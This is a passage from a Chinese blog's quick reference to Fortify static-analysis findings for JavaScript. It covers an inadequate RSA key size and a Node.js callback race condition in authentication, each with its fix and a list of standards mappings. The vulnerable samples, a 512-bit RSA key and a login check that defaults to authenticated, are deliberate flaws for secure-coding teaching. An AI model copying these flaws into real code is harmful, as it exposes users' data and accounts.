<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">crmfObject = crypto.generateCRMFRequest(</span><br><span class="line"></span><br><span class="line">              &quot;CN=&quot; + name.value,</span><br><span class="line"></span><br><span class="line">              password.value,</span><br><span class="line"></span><br><span class="line">              authenticator,</span><br><span class="line"></span><br><span class="line">      	keyTransportCert,</span><br><span class="line"></span><br><span class="line">              &quot;setCRMFRequest();&quot;,</span><br><span class="line"></span><br><span class="line">              512, null, &quot;rsa-dual-use&quot;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>对于对称加密，密钥长度必须至少为 128 位。</p>
<h5 id="RECOMMENDATIONS-73"><a href="#RECOMMENDATIONS-73" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>最低限度下，确保 RSA 密钥长度不少于 2048 位。未来几年需要较强加密的应用程序的密码长度应至少为 4096 位。</p>
<p>如果使用 RSA 算法，请确保特定密钥的长度至少为 2048 位。</p>
<p>示例 2：以下代码可生成 2048 位 RSA 密钥。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">crfmObject = crypto.generateCRMFRequest(</span><br><span class="line"></span><br><span class="line">              &quot;CN=&quot; + name.value,</span><br><span class="line"></span><br><span class="line">              password.value,</span><br><span class="line"></span><br><span class="line">              authenticator,</span><br><span class="line"></span><br><span class="line">              keyTransportCert,</span><br><span class="line"></span><br><span class="line">              &quot;setCRMFRequest();&quot;,</span><br><span class="line"></span><br><span class="line">              2048, null, &quot;rsa-dual-use&quot;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>同样，如果使用对称加密，请确保特定密钥的长度至少为 128 位（适用于 AES）和 168 位（适用于 Triple DES）。</p>
<h5 id="REFERENCES-72"><a href="#REFERENCES-72" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] J. Cheng 307-digit key crack endangers 1024-bit RSA </p>
<p>[2] Cryptographic Algorithms and Key Sizes for Personal Identity Verification NIST</p>
<p>[3] B. Chess and J. West, Secure Programming with Static Analysis. Boston, MA: Addison-Wesley, 2007. </p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 326 </p>
<p>[5] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002450 </p>
<p>[6] Standards Mapping - FIPS200 MP </p>
<p>[7] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[8] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-12 Cryptographic Key Establishment and Management (P1) </p>
<p>[9] Standards Mapping - OWASP Application Security Verification Standard 4.0 2.6.3 Look-up Secret Verifier Requirements, 2.8.3 Single or Multi Factor One Time Verifier Requirements, 6.2.1 Algorithms, 6.2.3 Algorithms, 6.2.4 Algorithms, 6.2.5 Algorithms, 6.2.6 Algorithms, 9.1.2 Communications Security Requirements, 9.1.3 Communications Security Requirements </p>
<p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M6 Broken Cryptography </p>
<p>[11] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[12] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[13] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[14] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[15] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.6.1, Requirement 6.5.8 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.6.1, Requirement 6.3.1.3, Requirement 6.5.8 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.6.1, Requirement 6.5.3 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.6.1, Requirement 6.5.3 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.6.1, Requirement 6.5.3 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.6.1, Requirement 6.5.3 </p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 3.6.1, Requirement 6.5.3 </p>
<p>[23] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 7.2 - Use of Cryptography </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3150.1 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3150.1 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3150.1 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3150.1 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3150.1 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3150.1 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3150.1 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<h3 id="时间和状态"><a href="#时间和状态" class="headerlink" title="时间和状态"></a>时间和状态</h3><h4 id="Race-Condition"><a href="#Race-Condition" class="headerlink" title="Race Condition"></a>Race Condition</h4><h5 id="ABSTRACT-74"><a href="#ABSTRACT-74" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>所设置的回调可能导致争用条件。</p>
<h5 id="EXPLANATION-74"><a href="#EXPLANATION-74" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Node.js 允许开发人员将回调分配给 IO 阻止的事件。这样可提高性能，因为回调可异步运行，从而使主应用程序不会被 IO 阻止。但是，如果回调外部的某些内容依赖于先运行的回调内的代码，这反过来会造成争用条件。 </p>
<p>示例 1：以下代码可基于数据库对用户进行身份验证。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">var authenticated = true; </span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">database_connect.query(&apos;SELECT * FROM users WHERE name == ? AND password = ? LIMIT 1&apos;, userNameFromUser, passwordFromUser, function(err, results)&#123;</span><br><span class="line"></span><br><span class="line">  if (!err &amp;&amp; results.length &gt; 0)&#123;</span><br><span class="line"></span><br><span class="line">    authenticated = true;</span><br><span class="line"></span><br><span class="line">  &#125;else&#123;</span><br><span class="line"></span><br><span class="line">    authenticated = false;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">if (authenticated)&#123;</span><br><span class="line"></span><br><span class="line">  //do something privileged stuff</span><br><span class="line"></span><br><span class="line">  authenticatedActions();</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">  sendUnathenticatedMessage();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在此示例中，我们应当调用到后端数据库，以确定用户用于登录的凭据，确认有效后，将变量设置为 true，否则设置为 false。令人遗憾的是，由于回调被 IO 阻止，它将异步运行且可能在检查 if (authenticated) 之后运行，由于默认值为 true，它将进入 if-statement，确认用户实际上是否已经过身份验证。</p>
<h5 id="RECOMMENDATIONS-74"><a href="#RECOMMENDATIONS-74" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>创建 Node.js 应用程序时，必须特别注意 IO 阻止的事件以及相关回调所执行的功能。可能存在需要按特定顺序调用的一系列回调，或者存在只能在运行某个回调后访问的代码。</p>
<p>示例 2：以下代码会修复Example 1 中的争用条件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">database_connect.query(&apos;SELECT * FROM users WHERE name == ? AND password = ? LIMIT 1&apos;, userNameFromUser, passwordFromUser, function(err, results)&#123;</span><br><span class="line"></span><br><span class="line">  if (!err &amp;&amp; results.length &gt; 0)&#123;</span><br><span class="line"></span><br><span class="line">    // do privileged stuff</span><br><span class="line"></span><br><span class="line">    authenticatedActions();</span><br><span class="line"></span><br><span class="line">  &#125;else&#123;</span><br><span class="line"></span><br><span class="line">    sendUnauthenticatedMessage();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这是一个简单的示例，现实生活中的情况可能要复杂得多，并且完成修复可能需要大量修改基本代码。尝试避免这些问题的简单方法是使用采用 promises 的 API，因为它们代表异步操作的最终结果，并且可用于指定成功的回调和失败的回调。如果经常使用此段代码，则最好创建可返回 promise 以进行身份验证的 API，从而将开发人员需要编写的代码简化为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">promiseAuthentication()</span><br><span class="line"></span><br><span class="line">.then(authenticatedActions, sendUnauthenticatedMessage);</span><br></pre></td></tr></table></figure>
<p>这反过来能够更轻松地执行代码并防止争用条件，因为代码将始终按明确定义的顺序运行。</p>
<h5 id="REFERENCES-73"><a href="#REFERENCES-73" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Kristopher Kowal Documentation for q </p>
<p>[2] Piotr Pelczar Asynchronous programming done right. </p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 362, CWE ID 367 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-003178 </p>
<p>[5] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[6] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.11.2 Business Logic Architectural Requirements, 1.11.3 Business Logic Architectural Requirements, 1.11.2 Business Logic Architectural Requirements, 1.11.3 Business Logic Architectural Requirements, 11.1.6 Business Logic Security Requirements </p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6 </p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6 </p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6 </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.6 </p>
<p>[11] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[12] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 362 </p>
<p>[13] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 362 </p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3630.1 CAT II </p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3630.1 CAT II </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3630.1 CAT II </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3630.1 CAT II </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3630.1 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3630.1 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3630.1 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001995 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-001995 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001995 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001995 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-001995 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-001995 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-001995 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-001995 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-001995 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-001995 CAT II </p>

      



      

  <div class="declare">
  <br><br>
  <strong>本文链接：</strong>
  http://dayun.shystartree.online/2020/04/20/fortify扫描结果速查(JavaScript)/
  <br>
  <strong>版权声明：</strong>本博客所有文章除特别声明外，均采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a><a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="知识共享许可协议" style="border-width:0" src="/img/licensee.png"/></a>许可协议。欢迎转载，但转载请注明来自qingyu’s blog，并保持转载后文章内容的完整，本人保留所有版权相关权利。
  
  
  </div>





      
        <div class="page-reward">
          <a href="javascript:;" class="page-reward-btn tooltip-top">
            <div class="tooltip tooltip-east">
            <span class="tooltip-item">
              赏
            </span>
            <span class="tooltip-content">
              <span class="tooltip-text">
                <span class="tooltip-inner">
                  <p class="reward-p"><i class="icon icon-quo-left"></i>觉得写得好可以请我吃杯奶茶支持下哦～～～<i class="icon icon-quo-right"></i></p>
                  <div class="reward-box">
                    
                    <div class="reward-box-item">
                      <img class="reward-img" src="/img/alipay.jpg">
                      <span class="reward-type">支付宝</span>
                    </div>
                    
                    
                    <div class="reward-box-item">
                      <img class="reward-img" src="/img/wxpay.jpg">
                      <span class="reward-type">微信</span>
                    </div>
                    
                  </div>
                </span>
              </span>
            </span>
          </div>
          </a>
        </div>
      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
        		</li>
      		 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">fortify</a>
        		</li>
      		 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">速查</a>
        		</li>
      		
		</ul>
	</div>

      

      

      
        
<div class="share-btn share-icons tooltip-left">
  <div class="tooltip tooltip-east">
    <span class="tooltip-item">
      <a href="javascript:;" class="share-sns share-outer">
        <i class="icon icon-share"></i>
      </a>
    </span>
    <span class="tooltip-content">
      <div class="share-wrap">
        <div class="share-icons">
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="icon icon-weibo"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="icon icon-weixin"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="icon icon-qq"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="icon icon-douban"></i>
          </a>
          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a>
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="icon icon-facebook"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="icon icon-twitter"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="icon icon-google"></i>
          </a>
        </div>
      </div>
    </span>
  </div>
</div>

<div class="page-modal wx-share js-wx-box">
    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//pan.baidu.com/share/qrcode?url=http://dayun.shystartree.online/2020/04/20/fortify扫描结果速查(JavaScript)/" alt="微信分享二维码">
    </div>
</div>

<div class="mask js-mask"></div>
      
      <div class="clearfix"></div>
    </div>
  </div>
</article>

  
<nav id="article-nav">
  
    <a href="/2020/05/20/fortify扫描结果速查(PHP)/" id="article-nav-newer" class="article-nav-link-wrap">
      <i class="icon-circle-left"></i>
      <div class="article-nav-title">
        
          fortify扫描结果速查(PHP)
        
      </div>
    </a>
  
  
    <a href="/2020/03/27/使用github进行信息收集与安全防御/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">使用github进行信息收集与安全防御</div>
      <i class="icon-circle-right"></i>
    </a>
  
</nav>


<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
        <div class="toc-container tooltip-left">
            <i class="icon-font icon-category"></i>
            <div class="tooltip tooltip-east">
                <span class="tooltip-item">
                </span>
                <span class="tooltip-content">
                    <div class="toc-article">
                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaScript"><span class="toc-number">1.</span> <span class="toc-text">JavaScript</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#API误用"><span class="toc-number">1.1.</span> <span class="toc-text">API误用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Negative-Content-Length"><span class="toc-number">1.1.1.</span> <span class="toc-text">Code Correctness: Negative Content-Length</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-Mixing-Template-Languages"><span class="toc-number">1.1.2.</span> <span class="toc-text">Often Misused: Mixing Template Languages</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-1"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-1"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-1"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-1"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#封装"><span class="toc-number">1.2.</span> <span class="toc-text">封装</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Frame-Scripting"><span class="toc-number">1.2.1.</span> <span class="toc-text">Cross-Frame Scripting</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-2"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-2"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-2"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-2"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Session-Contamination"><span class="toc-number">1.2.2.</span> <span class="toc-text">Cross-Session Contamination</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-3"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-3"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-3"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-3"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Request-Forgery"><span class="toc-number">1.2.3.</span> <span class="toc-text">Cross-Site Request Forgery</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-4"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-4"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-4"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-4"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-Untrusted-HTML-Downloads"><span class="toc-number">1.2.4.</span> <span class="toc-text">Cross-Site Scripting: Untrusted HTML Downloads</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-5"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-5"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-5"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-5"><span class="toc-number">1.2.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Easy-to-Guess-Database-Name"><span class="toc-number">1.2.5.</span> <span class="toc-text">HTML5: Easy-to-Guess Database Name</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-6"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-6"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-6"><span class="toc-number">1.2.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-6"><span class="toc-number">1.2.5.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Overly-Permissive-Message-Posting-Policy"><span class="toc-number">1.2.6.</span> <span class="toc-text">HTML5: Overly Permissive Message Posting Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-7"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-7"><span class="toc-number">1.2.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-7"><span class="toc-number">1.2.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-7"><span class="toc-number">1.2.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript-Hijacking"><span class="toc-number">1.2.7.</span> <span class="toc-text">JavaScript Hijacking</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-8"><span class="toc-number">1.2.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-8"><span class="toc-number">1.2.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-8"><span class="toc-number">1.2.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-8"><span class="toc-number">1.2.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript-Hijacking-Vulnerable-Framework"><span class="toc-number">1.2.8.</span> <span class="toc-text">JavaScript Hijacking: Vulnerable Framework</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-9"><span class="toc-number">1.2.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-9"><span class="toc-number">1.2.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-9"><span class="toc-number">1.2.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-9"><span class="toc-number">1.2.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Logging-Practice-Use-of-a-System-Output-Stream"><span class="toc-number">1.2.9.</span> <span class="toc-text">Poor Logging Practice: Use of a System Output Stream</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-10"><span class="toc-number">1.2.9.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-10"><span class="toc-number">1.2.9.2.</span> <span 